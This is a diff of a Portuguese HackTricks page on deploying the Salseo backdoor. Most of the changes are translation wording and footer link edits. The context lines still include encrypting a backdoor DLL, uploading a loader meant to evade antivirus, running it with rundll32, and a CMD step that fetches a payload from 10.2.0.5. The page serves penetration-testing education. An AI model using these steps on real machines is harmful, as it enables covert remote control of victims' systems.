@@ -9,7 +9,7 @@ Outras maneiras de apoiar o HackTricks:
 * Se você quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
 * Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
 * Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
+* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
 * **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.
 
 </details>
@@ -46,7 +46,7 @@ EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
 ```
 Ok, agora você tem tudo o que precisa para executar todo o Salseo: o **EvilDalsa.dll codificado** e o **binário do SalseoLoader.**
 
-**Faça o upload do binário SalseoLoader.exe na máquina. Eles não devem ser detectados por nenhum AV...**
+**Faça o upload do binário SalseoLoader.exe para a máquina. Eles não devem ser detectados por nenhum AV...**
 
 ## **Executar a backdoor**
 
@@ -87,17 +87,17 @@ Abra o projeto SalseoLoader usando o Visual Studio.
 
 ### Adicione antes da função principal: \[DllExport]
 
-![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
 ### Instale o DllExport para este projeto
 
 #### **Ferramentas** --> **Gerenciador de Pacotes NuGet** --> **Gerenciar Pacotes NuGet para a Solução...**
 
-![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
-#### **Procure pelo pacote DllExport (usando a guia Procurar) e pressione Instalar (e aceite o popup)**
+#### **Procure pelo pacote DllExport (usando a guia Procurar), e pressione Instalar (e aceite o popup)**
 
-![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
 Na pasta do seu projeto aparecerão os arquivos: **DllExport.bat** e **DllExport\_Configure.bat**
 
@@ -135,9 +135,9 @@ Selecione **plataforma x64** (Projeto --> Propriedades do SalseoLoader --> Compi
 
 Para **construir** a solução: Build --> Build Solution (Dentro do console de saída, o caminho da nova DLL aparecerá)
 
-### Teste a DLL gerada
+### Teste a Dll gerada
 
-Copie e cole a DLL onde deseja testá-la.
+Copie e cole a Dll onde deseja testá-la.
 
 Execute:
 ```
@@ -160,7 +160,7 @@ rundll32.exe SalseoLoader.dll,main
 ```
 ### CMD
 
-O **CMD** é um backdoor simples que permite a execução de comandos no sistema operacional alvo. Ele pode ser usado para obter informações do sistema, manipular arquivos e executar outras atividades maliciosas. É importante proteger o sistema contra a instalação e execução desse tipo de backdoor.
+O **CMD** é um backdoor simples que permite a execução de comandos no sistema operacional alvo. Ele pode ser usado para obter informações do sistema, manipular arquivos e executar outras atividades maliciosas. É importante proteger o sistema contra a instalação e execução de backdoors como o **CMD** para garantir a segurança dos dados e da rede.
 ```
 set pass=password
 set payload=http://10.2.0.5/evilsalsax64.dll.txt
@@ -178,7 +178,7 @@ Outras maneiras de apoiar o HackTricks:
 * Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
 * Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
 * Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
+* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
 * **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.
 
 </details>
